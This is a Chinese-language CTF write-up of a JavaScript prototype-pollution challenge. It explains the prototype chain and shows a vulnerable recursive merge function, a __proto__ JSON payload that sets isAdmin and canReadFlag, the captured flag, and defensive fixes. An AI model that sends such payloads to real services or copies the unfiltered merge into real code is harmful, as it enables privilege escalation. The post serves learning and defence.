---
title: "原型链污染题目复现"
date: 2026-09-27
draft: false
---

已经4天没学习了，可能是因为原神更新吧

{{< figure src="https://github.com/user-attachments/assets/600f6a3b-fb38-476b-aba1-1ab37a051220" alt="屏幕截图 2026-09-27 230253" >}}

不知不觉已经到至冬了，旅程也快到了终点...
我超威我在扯什么

## 咳咳先看题

{{< figure src="https://github.com/user-attachments/assets/612e1574-3b73-4457-9916-f7b724438291" alt="屏幕截图 2026-09-27 224924" >}}

合乎粥礼...

题目上还有proto，原型链污染

了解什么是原型链污染，题目的比喻其实很贴切

JavaScript 里有个规矩：

> 你问一个对象要东西，它自己没有的话，它会去问它的"爸爸"；爸爸没有，就去问"爷爷"……一直问到"老祖宗"。

这个"爸爸/爷爷/老祖宗"就叫 原型（prototype），这一串关系就叫 原型链。

```text
配置对象  {nickname: "guest"}
      ↓ 爸爸
  某个原型对象
      ↓ 爷爷
  某个原型对象
      ↓ 老祖宗
  Object.prototype   ← 所有普通 JS 对象的共同祖先
```

`__proto__` 不是普通属性，它是 JS 留的一把特殊钥匙：读写它就等于直接操作爸爸（原型）

### 漏洞是怎么发生的？

```js
function badMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      badMerge(target[key], source[key]);
    } else {
      target[key] = source[key];   // 这就是祸根
    }
  }
}
```

也挺无辜的，平时就给对象加个属性，但如果这个key是proto的话代码性质就彻底变了

## 看题

{{< figure src="https://github.com/user-attachments/assets/6270d38b-fbae-462b-a3e9-30169470aec1" alt="屏幕截图 2026-09-27 222958" >}}

访问 `GET /api/me`，返回里有个字段

{{< figure src="https://github.com/user-attachments/assets/f1a6f46a-2467-45b1-86f0-190e35ebf975" alt="屏幕截图 2026-09-27 223200" >}}

```json
inheritedProbe": { "isAdmin": null, "canReadFlag": null }
```

原理清楚的话直接开始操作吧

访问`api/profile`提交json配置

{{< figure src="https://github.com/user-attachments/assets/19fd037e-3d84-4e11-9683-c2ca641fdbfd" alt="屏幕截图 2026-09-27 223716" >}}

```json
{ "__proto__": { "isAdmin": true, "canReadFlag": true } }
```

输入完探针立刻变了

{{< figure src="https://github.com/user-attachments/assets/84fcda17-b259-442a-bc36-a0e8483bdba9" alt="屏幕截图 2026-09-27 223522" >}}

OK拿flag去

访问`http://127.0.0.1:14049/api/flag`

拿到flag

```json
{ "ok": true, "flag": "moectf{0n3_pr070type_chan9e_@|l_06j3c7$_o8ey}" }
```

## 总结

原理：JS 读 obj.isAdmin 时，自己身上没有就顺着原型链往上找，一路找到所有对象的共同祖先 Object.prototype。 后端合并用户 JSON 时用了 target[key] = source[key]，没过滤 `key === '__proto__'`，于是 `__proto__` 里的东西被写到了老祖宗身上。 结果：进程里所有对象都"继承"到了 isAdmin = true —— 权限校验形同虚设

防御思路：

1. 合并 JSON 时拉黑三个 key：`__proto__`、`constructor`、`prototype`
2. 用 Object.create(null) 或 Map 存配置（没有家谱就没法被污染）
3. 权限判断用 Object.hasOwn(obj, 'isAdmin')，别用 obj.isAdmin
